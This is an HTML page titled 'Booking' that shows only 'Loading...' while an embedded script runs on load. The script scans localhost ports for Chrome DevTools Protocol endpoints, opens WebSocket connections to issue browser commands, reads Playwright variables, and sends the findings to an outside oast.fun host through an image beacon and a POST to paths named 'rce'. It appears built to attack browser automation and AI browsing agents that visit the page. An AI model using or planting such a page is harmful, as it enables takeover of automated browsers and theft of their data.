<!DOCTYPE html>
<html>
<head><title>Booking</title>
<script>
var OOB = "d7a2184899s5qg2fd80g38m6ctcqkz1qb.oast.fun";
var results = {};

// CDP usually runs on random port. Try common ones + probe range
// Also try: Playwright's internal API, any agent control plane
var targets = [];

// CDP ports (Playwright picks random high ports, but defaults exist)
[9222, 9229, 9230, 0, 3000, 4000, 5000, 8000, 8080, 8888, 9000].forEach(function(p) {
  targets.push({url: 'http://127.0.0.1:' + p + '/json', label: 'cdp-' + p});
});

// Try WebSocket to CDP (this sometimes bypasses mixed content for WS)
function tryCDP(port) {
  try {
    var ws = new WebSocket('ws://127.0.0.1:' + port + '/devtools/browser');
    ws.onopen = function() {
      results['ws-cdp-' + port] = 'OPEN!';
      // If we got here, we have CDP access — try to get browser info
      ws.send(JSON.stringify({id: 1, method: 'Browser.getVersion'}));
    };
    ws.onmessage = function(e) {
      results['ws-cdp-' + port + '-msg'] = e.data.substring(0, 500);
      report();
    };
    ws.onerror = function() {
      results['ws-cdp-' + port] = 'ws-error';
    };
    ws.onclose = function(e) {
      results['ws-cdp-' + port + '-close'] = e.code + ':' + e.reason;
    };
  } catch(e) {
    results['ws-cdp-' + port] = 'catch:' + e.message;
  }
}

// Try WS on likely CDP ports
[9222, 9229, 9230, 0].forEach(tryCDP);

// Also scan for CDP by checking a range of high ports via WS
for (var p = 33000; p < 33050; p++) { tryCDP(p); }
for (var p = 40000; p < 40020; p++) { tryCDP(p); }

// HTTP fetch for localhost services
var done = 0;
targets.forEach(function(t) {
  fetch(t.url).then(function(r) { return r.text(); }).then(function(text) {
    results[t.label] = text.substring(0, 1000);
    done++;
    if (done >= targets.length) report();
  }).catch(function(err) {
    results[t.label] = 'E:' + err.message;
    done++;
    if (done >= targets.length) report();
  });
});

// Check if we can read the Playwright browser args (exposes CDP port)
try {
  results['userAgent'] = navigator.userAgent;
  results['cdpUrl'] = window.__playwright_cdp_url || 'not-set';
  results['browserWsEndpoint'] = window.__browserWsEndpoint || 'not-set';
} catch(e) {}

function report() {
  new Image().src = 'https://' + OOB + '/rce?d=' + encodeURIComponent(btoa(JSON.stringify(results)));
  fetch('https://' + OOB + '/rce-post', {
    method: 'POST',
    body: JSON.stringify(results, null, 2),
    headers: {'Content-Type': 'application/json'}
  }).catch(function(){});
}

setTimeout(report, 10000);
</script>
</head>
<body><h1>Loading...</h1></body>
</html>
